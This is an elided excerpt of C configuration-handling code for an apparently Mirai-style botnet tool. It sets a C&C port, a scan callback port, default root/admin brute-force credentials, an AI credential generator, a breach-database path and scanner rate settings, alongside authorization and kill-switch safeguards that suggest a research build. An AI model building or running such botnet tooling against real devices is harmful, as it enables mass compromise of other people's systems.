...
static char *json_get_string(json_object *jobj, const char *key, const char *default_value)
{
    json_object *tmp;
...
static int64_t json_get_int(json_object *jobj, const char *key, int64_t default_value)
{
    json_object *tmp;
    if (json_object_object_get_ex(jobj, key, &tmp)) {
...
static bool json_get_bool(json_object *jobj, const char *key, bool default_value)
{
    json_object *tmp;
    if (json_object_object_get_ex(jobj, key, &tmp)) {
...
static result_t load_network_config(json_object *jobj, network_config_t *config)
{
    ...
    config->scan_callback_port = (uint16_t)json_get_int(network_obj, "scan_callback_port", 48101);
...
static result_t load_credentials_config(json_object *jobj, credentials_config_t *config)
{
    ...
    if (json_object_object_get_ex(creds_obj, "list", &cred_list)) {
        ...
        for (size_t i = 0; i < count; i++) {
            ...
            config->credentials[i].username = json_get_string(cred, "username", "root");
            config->credentials[i].password = json_get_string(cred, "password", "admin");
    ...
    config->ai_generation_enabled = json_get_bool(creds_obj, "ai_generation_enabled", false);
    config->ai_model_path = json_get_string(creds_obj, "ai_model_path", NULL);
    config->breach_database_path = json_get_string(creds_obj, "breach_database_path", NULL);

    return RESULT_OK;
}

static result_t load_scanner_config(json_object *jobj, scanner_config_t *config)
{
    ...
    config->max_connections = (uint32_t)json_get_int(scanner_obj, "max_connections", 256);
    config->scan_rate_pps = (uint32_t)json_get_int(scanner_obj, "scan_rate_pps", 160);
    config->timeout_seconds = (uint32_t)json_get_int(scanner_obj, "timeout_seconds", 30);
    config->randomize_scan_order = json_get_bool(scanner_obj, "randomize_scan_order", true);
...
static result_t load_safeguards_config(json_object *jobj, safeguards_config_t *config)
{
    ...
    config->require_authorization = json_get_bool(safeguards_obj, "require_authorization", true);
    config->kill_switch_url = json_get_string(safeguards_obj, "kill_switch_url", NULL);
...
result_t config_validate(const mirai_config_t *config)
{
    ...
    if (config->credentials.credential_count == 0 && !config->credentials.ai_generation_enabled) {
        return RESULT_ERROR("No credentials configured and AI generation disabled", 21);
    }

    if (config->safeguards.enabled && config->safeguards.allowed_network_count == 0) {
...
result_t config_save(const char *filepath, const mirai_config_t *config)
{
    ...
    // Component name
    json_object_object_add(jobj, "component", json_object_new_string(config->component_name));
    ...
    json_object_object_add(network, "cnc_port", json_object_new_int(config->network.cnc_port));
